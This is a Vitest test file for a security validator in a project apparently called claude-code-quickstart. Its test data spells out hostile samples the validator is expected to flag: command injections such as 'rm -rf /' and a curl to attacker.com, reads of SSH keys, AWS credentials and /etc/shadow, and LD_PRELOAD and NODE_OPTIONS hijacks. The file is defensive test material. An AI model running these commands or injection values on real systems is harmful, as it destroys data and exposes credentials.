import { describe, test, expect, beforeEach } from "vitest";
import { promises as fs } from "fs";
import path from "path";
import os from "os";

// This import SHOULD exist after refactoring but WILL FAIL initially
import { createSecurityValidator, type SecurityValidator } from "./security-validator.js";
import type { SecurityCheckResult, ThreatLevel } from "./e2e-types.js";

describe("REQ-203 — Security Validator Implementation", () => {
  let securityValidator: SecurityValidator;

  beforeEach(async () => {
    // This SHOULD create a security validator but WILL FAIL initially
    securityValidator = await createSecurityValidator();
  });

  describe("security_vulnerabilities", () => {
    test("REQ-203 — detects command injection patterns", async () => {
      const maliciousCommands = [
        { cmd: ["ls", "; rm -rf /"], expected: ["command_injection"] },
        { cmd: ["echo", "test && cat /etc/passwd"], expected: ["command_injection"] },
        { cmd: ["node", "--eval", "`curl attacker.com`"], expected: ["command_injection"] },
        { cmd: ["npm", "install", "$(malicious-script)"], expected: ["command_injection"] },
        { cmd: ["git", "clone", "https://github.com/user/repo.git; rm -rf ."], expected: ["command_injection"] },
      ];

      for (const { cmd, expected } of maliciousCommands) {
        const result: SecurityCheckResult = await securityValidator.validateCommand(cmd);
        
        expect(result.safe).toBe(false);
        expect(result.threatLevel).toBeOneOf(["HIGH", "CRITICAL"] as ThreatLevel[]);
        expect(result.threats).toEqual(expect.arrayContaining(expected));
        expect(result.reason).toContain("injection");
      }
    });

    test("REQ-203 — detects path traversal attempts", async () => {
      const maliciousPaths = [
        { path: "../../../etc/passwd", expected: ["path_traversal"] },
        { path: "..\\..\\..\\windows\\system32\\config", expected: ["path_traversal"] },
        { path: "/etc/shadow", expected: ["unauthorized_access"] },
        { path: "~/.ssh/id_rsa", expected: ["unauthorized_access"] },
        { path: "/root/.aws/credentials", expected: ["unauthorized_access"] },
        { path: "file:///etc/hosts", expected: ["protocol_injection"] },
      ];

      for (const { path: testPath, expected } of maliciousPaths) {
        const result: SecurityCheckResult = await securityValidator.validatePath(testPath);
        
        expect(result.safe).toBe(false);
        expect(result.threatLevel).toBeOneOf(["MEDIUM", "HIGH", "CRITICAL"] as ThreatLevel[]);
        expect(result.threats).toEqual(expect.arrayContaining(expected));
      }
    });

    test("REQ-203 — detects environment variable injection", async () => {
      const maliciousEnvVars = [
        { 
          env: { NODE_OPTIONS: "--inspect=0.0.0.0:9229 --require ./malicious.js" },
          expected: ["env_injection", "code_execution"]
        },
        { 
          env: { PATH: "/malicious/bin:" + process.env.PATH },
          expected: ["path_hijacking"]
        },
        { 
          env: { LD_PRELOAD: "/tmp/malicious.so" },
          expected: ["library_injection"]
        },
        { 
          env: { DYLD_INSERT_LIBRARIES: "/tmp/malicious.dylib" },
          expected: ["library_injection"]
        },
        {
          env: { HOME: "/tmp/fake-home" },
          expected: ["directory_spoofing"]
        },
      ];

      for (const { env, expected } of maliciousEnvVars) {
        const result: SecurityCheckResult = await securityValidator.validateEnvironment(env);
        
        expect(result.safe).toBe(false);
        expect(result.threatLevel).toBeOneOf(["MEDIUM", "HIGH", "CRITICAL"] as ThreatLevel[]);
        expect(result.threats).toEqual(expect.arrayContaining(expected));
      }
    });

    test("REQ-203 — detects buffer overflow and format string attacks", async () => {
      const attackInputs = [
        { 
          input: "A".repeat(10000), 
          expected: ["buffer_overflow"],
          description: "Large buffer input"
        },
        { 
          input: "%s%s%s%s%s%s%s%s", 
          expected: ["format_string"],
          description: "Format string attack"
        },
        { 
          input: "\x00\x01\x02\x03", 
          expected: ["control_characters"],
          description: "Control character injection"
        },
        { 
          input: "\n\r\t" + "A".repeat(1000), 
          expected: ["buffer_overflow", "control_characters"],
          description: "Mixed line breaks with buffer overflow"
        },
        {
          input: "/../" + "A".repeat(5000) + "/../etc/passwd",
          expected: ["buffer_overflow", "path_traversal"],
          description: "Combined buffer overflow and path traversal"
        },
      ];

      for (const { input, expected, description } of attackInputs) {
        const result: SecurityCheckResult = await securityValidator.validateInput(input);
        
        expect(result.safe).toBe(false);
        expect(result.threatLevel).toBeOneOf(["MEDIUM", "HIGH", "CRITICAL"] as ThreatLevel[]);
        expect(result.threats).toEqual(expect.arrayContaining(expected));
        expect(result.reason).toBeDefined();
      }
    });

    test("REQ-203 — allows safe inputs and commands", async () => {
      const safeCommands = [
        ["node", "--version"],
        ["npm", "--version"],
        ["ls", "-la"],
        ["pwd"],
        ["echo", "hello world"],
      ];

      for (const cmd of safeCommands) {
        const result: SecurityCheckResult = await securityValidator.validateCommand(cmd);
        expect(result.safe).toBe(true);
        expect(result.threatLevel).toBe("NONE");
        expect(result.threats).toHaveLength(0);
      }
    });

    test("REQ-203 — allows safe paths within project boundaries", async () => {
      const safePaths = [
        "./package.json",
        "src/index.ts",
        "test/utils/test-file.txt",
        "/tmp/safe-temp-file",
        path.join(os.homedir(), ".claude", "config.json"),
      ];

      for (const testPath of safePaths) {
        const result: SecurityCheckResult = await securityValidator.validatePath(testPath);
        expect(result.safe).toBe(true);
        expect(result.threatLevel).toBe("NONE");
        expect(result.threats).toHaveLength(0);
      }
    });

    test("REQ-203 — allows safe environment variables", async () => {
      const safeEnvVars = [
        { NODE_ENV: "test" },
        { DEBUG: "1" },
        { CI: "true" },
        { GITHUB_ACTIONS: "true" },
        { TEST_TIMEOUT: "5000" },
      ];

      for (const env of safeEnvVars) {
        const result: SecurityCheckResult = await securityValidator.validateEnvironment(env);
        expect(result.safe).toBe(true);
        expect(result.threatLevel).toBe("NONE");
        expect(result.threats).toHaveLength(0);
      }
    });
  });

  describe("REQ-201 — Security Validator Architecture", () => {
    test("REQ-201 — security validator is focused module under size limits", async () => {
      const securityValidatorPath = "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/security-validator.ts";
      const content = await fs.readFile(securityValidatorPath, "utf-8");
      const lineCount = content.split("\n").length;
      
      // Module should be under 300 lines
      expect(lineCount).toBeLessThanOrEqual(300);
      
      // Should only export security validation functions
      const exports = content.match(/export\s+(?:async\s+)?(?:function|class|const)\s+\w+/g) || [];
      expect(exports.length).toBeLessThanOrEqual(8); // Focused on security only
      
      // Should not contain CLI execution or test environment logic
      expect(content).not.toContain("spawn");
      expect(content).not.toContain("createTempDir");
      expect(content).not.toContain("executeWorkflow");
    });

    test("REQ-204 — security validator has comprehensive test coverage", async () => {
      const securityTestPath = "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/security-validator.spec.ts";
      const testContent = await fs.readFile(securityTestPath, "utf-8");
      
      // Should test all major security threats
      const requiredTests = [
        "command_injection",
        "path_traversal", 
        "env_injection",
        "buffer_overflow",
        "format_string",
        "control_characters",
      ];
      
      for (const testType of requiredTests) {
        expect(testContent.toLowerCase()).toContain(testType);
      }
      
      // Should reference REQ-203 in test names
      expect(testContent).toContain("REQ-203");
    });
  });

  describe("REQ-205 — Security Validator Error Handling", () => {
    test("REQ-205 — handles malformed input gracefully", async () => {
      const malformedInputs = [
        null,
        undefined,
        {},
        [],
        { toString: () => { throw new Error("Malicious toString"); } },
      ];

      for (const input of malformedInputs) {
        // Should handle malformed input without crashing
        const result = await securityValidator.validateInput(input as any);
        expect(result).toBeDefined();
        expect(result.safe).toBe(false);
        expect(result.threats).toContain("malformed_input");
      }
    });

    test("REQ-205 — properly handles validation errors without resource leaks", async () => {
      const errorCausingInputs = [
        "A".repeat(100000), // Extremely large input
        "\u0000".repeat(1000), // Null byte flood
        Array(1000).fill("../").join(""), // Path traversal flood
      ];

      const initialMemory = process.memoryUsage().heapUsed;
      
      for (const input of errorCausingInputs) {
        try {
          await securityValidator.validateInput(input);
        } catch (error) {
          // Errors should be caught and handled internally
          expect(error).toBeUndefined();
        }
      }
      
      // Force garbage collection if available
      if (global.gc) {
        global.gc();
      }
      
      const finalMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = finalMemory - initialMemory;
      
      // Memory increase should be reasonable (less than 10MB)
      expect(memoryIncrease).toBeLessThan(10 * 1024 * 1024);
    });
  });
});

describe("REQ-204 — TDD Compliance for Security Validator", () => {
  test("REQ-204 — all security validation functions have failing tests before implementation", async () => {
    const securityValidatorPath = "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/security-validator.ts";
    
    // File should exist
    const fileExists = await fs.access(securityValidatorPath).then(() => true).catch(() => false);
    expect(fileExists).toBe(true);
    
    const content = await fs.readFile(securityValidatorPath, "utf-8");
    
    // Should export required validation functions
    const requiredFunctions = [
      "validateCommand",
      "validatePath", 
      "validateEnvironment",
      "validateInput",
      "createSecurityValidator",
    ];
    
    for (const functionName of requiredFunctions) {
      expect(content).toContain(functionName);
    }
  });

  test("REQ-204 — security tests validate real vulnerabilities, not implementation details", async () => {
    // This test ensures that security tests focus on actual security threats
    // rather than testing implementation specifics
    
    const testFile = "/Users/travis/Library/CloudStorage/Dropbox/dev/claude-code-quickstart/test/utils/security-validator.spec.ts";
    const testContent = await fs.readFile(testFile, "utf-8");
    
    // Should test actual attack vectors
    const realAttackVectors = [
      "command injection",
      "path traversal",
      "buffer overflow",
      "format string",
      "environment injection",
    ];
    
    for (const attackVector of realAttackVectors) {
      expect(testContent.toLowerCase()).toContain(attackVector.replace(" ", "_"));
    }
    
    // Should NOT test internal implementation details
    const implementationDetails = [
      "regex pattern",
      "string.includes",
      "array.filter",
      "private method",
    ];
    
    for (const detail of implementationDetails) {
      expect(testContent.toLowerCase()).not.toContain(detail);
    }
  });
});